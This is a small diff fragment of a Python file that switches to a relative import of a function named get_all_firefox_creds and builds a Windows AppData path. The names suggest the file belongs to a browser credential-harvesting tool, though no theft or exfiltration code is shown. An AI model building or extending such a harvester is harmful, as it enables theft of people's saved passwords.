@@ -21,7 +21,8 @@ import tempfile
 from Crypto.Cipher import AES
 import aiofiles
 
-from firefox_harvester import get_all_firefox_creds
+# noinspection PyPackages
+from .firefox_harvester import get_all_firefox_creds
 
 APPDATA = environ['USERPROFILE'] + r"\AppData"
 
